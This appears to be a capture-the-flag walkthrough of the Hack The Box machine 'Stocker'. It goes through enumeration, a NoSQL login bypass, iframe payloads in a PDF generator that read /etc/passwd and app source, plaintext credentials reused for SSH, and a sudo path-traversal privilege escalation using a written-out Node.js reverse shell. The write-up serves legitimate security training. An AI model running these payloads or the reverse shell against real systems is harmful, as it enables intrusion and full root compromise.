# Stocker
Machine Name: Stocker
---------------------

*   **Status:** Active
*   **OS:** Linux
*   **Difficulty:** Easy
*   **Date Owned:** 6/8/2023
*   **IP Assigned:** 10.10.11.196

Enumeration:
------------

First I'll start an NMAP scan to look for any open ports on the target using the following switches:

*   \-sS: syn scan, this is quick and stealthy as it does not complete the TCP connection. It can also differentiation between open, closed, and filtered states of a port. I will need to be run with sudo privileges as it requires raw packet manipulation.
*   \-A: enables aggressive scanning and will enable OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (-traceroute).
*   \-p-: will scan all ports on the host.
*   \-T4: timing template 4 is a predefined packet limit per millisecond. Template 4 is considered aggressive.
*   \-oN: output the results to a file.
*   Note: if not otherwise specified nmap will scan the top 1000 TCP ports.

```text-plain
sudo nmap -sS -A -T4 -oN nmap.txt 10.10.11.196
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 20:31 EDT
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-title: Stock - Coming Soon!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=6/5%OT=22%CT=1%CU=41092%PV=Y%DS=2%DC=T%G=Y%TM=647E7E81
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11
OS:NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   25.15 ms 10.10.14.1
2   25.20 ms stocker.htb (10.10.11.196)
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.18 seconds
```

Add stocker.htb to etc/hosts

```text-plain
echo ‘10.10.11.196 stocker.htb’ | sudo tee -a /etc/hosts
```

Naviagte to the web page 

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/85dbd820-bc36-4457-ab47-01bcb97ee03f)

Not much to go on here.

Look for vhosts with ffuf.

```text-plain
ffuf -u http://stocker.htb -H "Host: FUZZ.stocker.htb" -fc 301 -w /usr/share/seclists/Discovery/DNS/namelist.txt
       /'___\  /'___\           /'___\       
      /\ \__/ /\ \__/  __  __  /\ \__/       
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
        \ \_\   \ \_\  \ \____/  \ \_\       
         \/_/    \/_/   \/___/    \/_/      
      v1.5.0 Kali Exclusive <3
________________________________________________
:: Method           : GET
:: URL              : http://stocker.htb
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
:: Header           : Host: FUZZ.stocker.htb
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
:: Filter           : Response status: 301
________________________________________________
dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 36ms]
:: Progress: [151265/151265] :: Job [1/1] :: 1495 req/sec :: Duration: [0:01:49] :: Errors: 0 ::
```

Ffuf found dev.stocker.htb which directs to a login page.

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/cab9be53-ba08-429c-a733-0800ed9c84ef)


Injection Attack
----------------

Capture the request from the blank login page with burpsute proxy using intercept.

Right click the request and send it to the repeater. I wasnt able to find anything in the page source indicating the backend so I tried a bunch of different injection types. I eventually found a noSQL payload here: [https://book.hacktricks.xyz/pentesting-web/nosql-injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection). Dont forget to change the Content-type field to json when using json payloads.

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/02b8ba42-02b8-4be7-9825-aaab80f20a1e)


Request the response in the browser and turn intercept off if its still enabled. We are now logged into the page and redirected to /stock which lists products that can be purchased. Add something to the cart and check out, intercept this traffic with burpsuite proxy.

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/aa87ca49-0552-461a-a1b9-bdb1ee45b0f5)


Remote File Inclusion
---------------------

Submitting the purchase will generate a PDF document that can be accessed via API. I tried a bunch of payloads here and ran into a dead end. Eventually I searched pdf on the hacktricks website and found this article. [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf). Try each of the fields, the title field appears to be vulnerable.

Test for LFI/RFI by requesting the /etc/passwd file.

```text-plain
<iframe src=file:///etc/passwd></iframe>
```

This worked! In order to read the file increase the size of the frame.

```text-plain
<iframe src=file:///etc/passwd width=100% height=1000></iframe>"
```

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/04588c7a-2382-4378-aa10-2a1acbd9cdda)


```text-plain
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/no login systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin landscape:x:109:116::/var/lib/landscape:/usr/sbin/nol ogin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin angoose:x:1001:1001:,,,:/home/angoose:/bin/bash _laurel:x:998:998::/var/log/laurel:/bin/false
```

Next look for the nginx config file in the standard location /etc/nginx/nginx.conf

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/c1ff2d78-6389-4857-841b-05c5ec1ddb2c)


It looks like the dev vhost is being run from /var/www/dev. I had to adjust the height a few times to get as much as I could onto the page, the pdf would not render if the iframe extended past the pagebreak.

Next I tried some common filenames that might exist in a nodejs directory. index.js was the first one that worked. lets check out /var/www/dev/index.js in the iframe.

![image](https://github.com/Arcsin00/HTB-Walkthroughs/assets/110564012/72be8454-932a-4df1-bcdf-9e58c3d72285)

Looks like there's some plaintext creds in this file.

> dev:IHeardPassphrasesArePrettySecure

Foothold
--------

Since dev is not listed as a user in the /etc/passwd file lets check for reuse on the only account with login capability ‘angoose’.

```text-plain
ssh angoose@10.10.11.196
angoose@10.10.11.196's password:
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
angoose@stocker:~$ 
```

That worked! The user flag is located at /home/angoose/user.txt

```text-plain
cat /home/angoose/user.txt
HTB{********************************}
```

Privilege Escalation
--------------------

Next check the user's permissions.

```text-plain
sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
   env_reset, mail_badpass,
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User angoose may run the following commands on stocker:
   (ALL) /usr/bin/node /usr/local/scripts/*.js
```

Angoose can use node to run anything that ends in .js in the /usr/local/scripts directory.

In order to exploit this first create a Nodejs reverse shell file and save it with the .js file extension on the attack machine.

Then start a simple http server on the attack machine, and use angoose to wget it on the target.

```text-plain
(function(){
   var net = require("net"),
       cp = require("child_process"),
       sh = cp.spawn("sh", []);
   var client = new net.Socket();
   client.connect(4444, "10.0.0.1", function(){
       client.pipe(sh.stdin);
       sh.stdout.pipe(client);
       sh.stderr.pipe(client);
   });
   return /a/; // Prevents the Node.js application from crashing
})();
```

Start a netcat listener on the attack box.

```text-plain
nc -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
```

Execute the rev shell with angoose.

```text-plain
sudo node /usr/local/scripts/../../../home/angoose/update.js
```

Root Shell
----------

Finally we caught the shell on our listener and have root permission on the target.

```text-plain
Ncat: Connection from 10.10.11.196.
Ncat: Connection from 10.10.11.196:52296.
id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at /root/root.txt

```text-plain
cat /root/root.txt
HTB{********************************}
```
